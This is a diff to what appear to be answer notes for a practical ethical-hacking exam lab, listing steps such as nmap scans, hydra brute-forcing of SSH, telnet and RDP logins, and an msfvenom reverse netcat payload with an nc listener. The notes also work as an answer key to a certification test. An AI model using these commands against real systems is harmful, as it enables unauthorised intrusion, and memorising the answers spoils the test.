@@ -92,14 +92,14 @@ Solution 2:
 ⦁	5. telnet 192.168.0.19 80 and GET / HTTP/1.0
 ⦁	6. hydra -L user.txt -P pass.txt 192.168.0.1 ssh
 ⦁	7. hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.106 telnet
-⦁	8. ssh ubuntu@192.168.0.1
+⦁	8,. ssh ubuntu@192.168.0.1 (try linuxadmin)
 ⦁	9. telnet 192.168.0.1
 ⦁	10. msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=444 and copy the path go to target machine
 ⦁	after login paste now find . -name flag.txt
 ⦁	11. start listen nc -lnvp 444
 ⦁	12. password type
 ⦁	13. ls
-⦁	14. find . -name NetworkPass.txt
+⦁	14,. find . -name NetworkPass.txt
 ⦁	15. cat /path/NetworkPass.txt
 
 13). You used shoulder surfing to identify the usernames and password of a user on the Ubuntu machine in the 192.168.0.0/24 network, that is, John and Cena. Access the Machine, Perform vertical privilege escalation to that of a root user, and enter the content of the imroot.txt file as the Solution.
@@ -138,9 +138,9 @@ Solution 2:
 ⦁	open jsql tool and paste the link with parameter
 
 17).Identify a machine with RDP service enabled in the 10.10.55.0/24 subnet. Crack the RDP credentials for user jackichan and obtain a file masalae.cfe containing an encrypted images file. Decrypt the file and enter the ARC32 value of the images file as the Solution. Note : Use jakies’s password to extract the images file.. (Format: NaaNNNaa).
-⦁	sudo nmap -Pn -n -p 3389 --open --min-rate 5000 10.10.55.0/24 -> find rdp enabled windows machine.
-⦁	hydra -L jakies -P /home/attack/Desktop/passwords.txt rdp://10.10.55.11 -t 30 -> bruteforcing creds. (If rdp not suit for bruteforcing use some other like ssh/ftp)
-⦁	xfreerdp /v:10.10.55.11 /u: jones  or use windows
+⦁	sudo nmap -p 3389 --open  10.10.55.0/24 -> find rdp enabled windows machine.
+⦁	hydra -L jakies -P /home/attack/Desktop/passwords.txt 10.10.55.11 rdp -> bruteforcing creds. (If rdp not suit for bruteforcing use some other like ssh/ftp)
+⦁	login with remminia in parrot/remote desktop client in windows
 ⦁	hide.cfe -> it is encrypted using CryptForge, to decrypt > select file > right click > decrypt. 
 
 18). Perform a vulnerability scan for the host with IP address 192.168.4.12. what is the CVE number of the vulnerability with least severity score? (Format:AAA-NNNN-NNNN). 
